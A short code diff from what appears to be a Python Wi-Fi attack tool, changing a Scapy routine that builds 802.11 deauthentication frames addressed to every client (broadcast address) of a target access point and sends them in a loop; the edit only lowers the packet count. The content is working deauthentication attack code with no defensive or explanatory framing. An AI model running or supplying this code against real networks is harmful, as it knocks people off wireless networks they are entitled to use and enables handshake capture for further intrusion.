@@ -110,8 +110,7 @@ class Network:
         ap = apAdr
         client = "FF:FF:FF:FF:FF:FF"
         pkt = RadioTap() / Dot11(addr1=client, addr2=ap, addr3=ap) / Dot11Deauth(reason=7)
-        sendp(pkt, iface=self.interface, inter=0.100, loop=1, count=50)
-
+        sendp(pkt, iface=self.interface, inter=0.100, loop=1, count=20)
     def autoDeAuth(self):
             time.sleep(1)
             print(self.attackAP)
